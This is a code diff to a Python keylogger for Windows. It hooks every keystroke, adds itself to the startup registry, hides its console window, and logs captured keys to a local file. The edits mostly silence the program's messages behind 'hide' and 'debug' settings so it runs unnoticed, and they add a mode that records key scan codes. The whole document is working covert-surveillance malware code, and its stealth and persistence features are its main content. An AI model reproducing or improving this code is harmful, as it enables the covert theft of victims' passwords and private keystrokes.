@@ -45,10 +45,10 @@ def read_config():
 read_config()
 
 # Disallowing multiple instances
-mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start')
+mutex = win32event.CreateMutex(None, 1, 'mutex_var_Start' + ('' if not config["mode"] == 'debug' else '_debug'))
 if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
     mutex = None
-    if config["mode"] == "debug":
+    if not config["hide"] or (config["mode"] == 'debug'):
         print("Multiple instances are not allowed")
     exit(0)
 
@@ -67,7 +67,8 @@ def add_to_startup():
     try:
         SetValueEx(key2change, LOGGER_NAME, 0, REG_SZ, reg_value)
     except Exception as e:
-        print(e)
+        if config["mode"] == 'debug':
+            print(e)
 
 # Remove from startup f
 def remove_from_startup():
@@ -78,11 +79,13 @@ def remove_from_startup():
     try:
         DeleteValue(key2change, LOGGER_NAME)  
     except Exception as e:
-        print(e, ". Not critical if logger isn't applied to startup")
+        if config["mode"] == 'debug':
+            print(e, ". Not critical if logger isn't applied to startup")
 
 # Debug logger
 def log_debug():
     global line_buffer
+    line_buffer = line_buffer.encode()
     print(line_buffer)
     line_buffer = ''
     return True
@@ -106,12 +109,14 @@ def log_it():
     if config["mode"] == "local":
         if len(line_buffer) >= config["buffer-size"]:
             log_local()
+    elif config["mode"] == "debug":
+        log_debug()
     return True
 
 def key_callback(event):
     global line_buffer, paused
-    is_pressed_ctrl = is_pressed('ctrl') | is_pressed('right ctrl')
-    is_pressed_alt = is_pressed('alt') | is_pressed('alt gr')
+    is_pressed_ctrl = is_pressed('ctrl') or is_pressed('right ctrl')
+    is_pressed_alt = is_pressed('alt') or is_pressed('alt gr')
     
 
     # while paused no logging
@@ -123,8 +128,8 @@ def key_callback(event):
         return True
         
     # Debug Mode
-    if config["mode"] == 'debug':
-        line_buffer += event.name
+    if config["mode"] == 'console':
+        line_buffer += event.name + " " + str(event.scan_code)
         log_debug()
         return True
 
@@ -148,17 +153,22 @@ def key_callback(event):
 
 def pause_logging():
     global paused, line_buffer
-    print(LOGGER_NAME + (" paused" if not paused else " continue"))
+    if not config["hide"] or (config["mode"] == 'debug'):
+        print(LOGGER_NAME + (" paused" if not paused else " continue"))
     paused = not paused
 
 def hide():
-    # Hide Console
-    window = win32console.GetConsoleWindow()
-    win32gui.ShowWindow(window, 0)
-    return True
+    if not config["mode"] == 'debug':
+        # Hide Console
+        window = win32console.GetConsoleWindow()
+        win32gui.ShowWindow(window, 0)
+        return True
+    else:
+        print("Console Hide")
 
 def main():
-    print(LOGGER_NAME + " started")
+    if not config["hide"] or (config["mode"] == 'debug'):
+        print(LOGGER_NAME + " started")
     keyboard.hook(key_callback)
     # To Pause the Keylogger (ctrl + alt + e)
     keyboard.add_hotkey(config["hotkeys"]["pause-hotkey"], pause_logging)
@@ -166,7 +176,7 @@ def main():
     keyboard.wait(config["hotkeys"]["exit-hotkey"]) 
     global line_buffer
     log_local()
-    if config["mode"] == 'debug':
+    if not config["hide"] or (config["mode"] == 'debug'):
         print(LOGGER_NAME + " stopped.")
     exit()
 
